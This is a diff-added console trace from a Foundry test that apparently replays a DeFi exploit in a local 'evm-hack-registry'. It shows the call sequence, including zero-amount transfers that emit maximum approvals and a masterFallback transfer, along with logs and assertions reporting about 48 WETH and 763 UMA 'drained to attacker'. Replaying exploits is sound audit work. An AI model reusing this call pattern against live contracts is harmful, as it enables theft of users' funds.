+    │   │   │   │   @ 0x4a1a13e44b32b8cb4a2c00ac6422b2c39b20116aae683b503873bfe9b6878738: 0 → 0x0000000000000000000000000000000000000000000000015533ed35111d827a
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [10098] 0x81fAb276aEC924fBDe190cf379783526D413CF70::transferFrom(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282, 0)
+    │   │   │   ├─ emit Transfer(from: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, to: 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282, amount: 0)
+    │   │   │   ├─ emit Approval(owner: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, spender: 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282, amount: 115792089237316195423570985008687907853269984665640564038576812825139567035495 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9825] 0x81fAb276aEC924fBDe190cf379783526D413CF70::burn(0)
+    │   │   │   ├─ emit Transfer(from: 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282, to: 0x0000000000000000000000000000000000000000, amount: 0)
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0x00000000000000000000000000000000000000000000000000000000694af603 → 0x000000000000000000000000000000000000000000000000000000006aa5bd53
+    │   │   │   @ 8: 0x000000000000000000000000000000000000000000000001643ee3fb52d90ebc → 0x0000000000000000000000000000000000000000000000000e450f29f53914e9
+    │   │   │   @ 0x4cd3612143aa7b8541b9f6f556d465b04bcf952108a570065410b7d06a17af4d: 0x000000000000000000000000000000000000000000000010ee38da26769c0fd1 → 0
+    │   │   │   @ 0x4cd3612143aa7b8541b9f6f556d465b04bcf952108a570065410b7d06a17af50: 0x0000000000000000000000000000000000000000000000040455a5f6085d3129 → 0
+    │   │   └─ ← [Return] Unsigned({ rawValue: 24586255602921865850 [2.458e19] })
+    │   └─ ← [Stop]
+    ├─ [534] WETH9::balanceOf(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835) [staticcall]
+    │   └─ ← [Return] 24586255602921865850 [2.458e19]
+    ├─ [5255] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::masterFallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xa9059cbb00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf9820000000000000000000000000000000000000000000000015533ed35111d827a)
+    │   ├─ [3262] WETH9::transfer(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 24586255602921865850 [2.458e19])
+    │   │   ├─ emit Transfer(from: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, to: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, amount: 24586255602921865850 [2.458e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4a1a13e44b32b8cb4a2c00ac6422b2c39b20116aae683b503873bfe9b6878738: 0x0000000000000000000000000000000000000000000000015533ed35111d827a → 0
+    │   │   │   @ 0xa228402b359e04d8f215fb9130d204d4363f6e676a7be80cb99633b5c196324d: 0x000000000000000000000000000000000000000000000001461da4a099a400b8 → 0x0000000000000000000000000000000000000000000000029b5191d5aac18332
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [534] WETH9::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   └─ ← [Return] 48085375043290366770 [4.808e19]
+    ├─ [519] 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   └─ ← [Return] 763101265318097645247 [7.631e20]
+    ├─ emit log_named_decimal_uint(key: "WETH drained from MAR", val: 23499119440368500920 [2.349e19], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "UMA  drained from MAR", val: 763101265318097645247 [7.631e20], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "WETH drained from FEB", val: 24586255602921865850 [2.458e19], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "TOTAL WETH drained to attacker", val: 48085375043290366770 [4.808e19], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "TOTAL UMA  drained to attacker", val: 763101265318097645247 [7.631e20], decimals: 18)
+    ├─ [0] VM::assertApproxEqRel(23499119440368500920 [2.349e19], 23499000000000000000 [2.349e19], 10000000000000000 [1e16], "MAR WETH ~= 23.50") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqRel(24586255602921865850 [2.458e19], 24586000000000000000 [2.458e19], 10000000000000000 [1e16], "FEB WETH ~= 24.59") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqRel(763101265318097645247 [7.631e20], 763100000000000000000 [7.631e20], 10000000000000000 [1e16], "UMA ~= 763") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(48085375043290366770 [4.808e19], 48000000000000000000 [4.8e19], "total WETH extraction should exceed 48 WETH") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.71s (33.65ms CPU time)
+
+Ran 1 test suite in 9.14s (3.71s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/Users/alex/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 24819 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /Users/alex/RustroverProjects/audits/evm-hack-registry/2026-09-YamFinance_exp)
